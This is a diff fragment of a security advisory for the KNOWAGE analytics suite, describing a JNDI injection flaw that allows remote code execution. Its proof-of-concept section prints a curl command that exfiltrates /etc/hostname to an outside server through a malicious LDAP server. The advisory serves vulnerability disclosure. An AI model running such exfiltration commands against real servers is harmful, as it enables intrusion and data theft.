@@ -7,7 +7,7 @@ KNOWAGE is the open source analytics and business intelligence suite that allows
 JNDI injection is a type of attack that occurs when an attacker is able to inject malicious data into the JNDI data source used by an application, allowing them to execute arbitrary code on the application server. Proper validation and sanitization of user input can prevent this type of attack by ensuring that only safe data is used in JNDI queries.
 
 ## Discovered By
-Jacopo Taccucci
+ [Jacopo Taccucci](https://www.linkedin.com/in/jacopo-taccucci/) 
 
 ## PoC
 The following PoC demonstrates how Remote Code Execution within the Knowage server can be achieved thanks to this vulnerability: Leveraging a malicious LDAP server will be conveyed the command `curl -d @/etc/hostname http://<redacted>.oastify.com` to exfiltrate the /etc/hostname file to a third http exfiltration server.
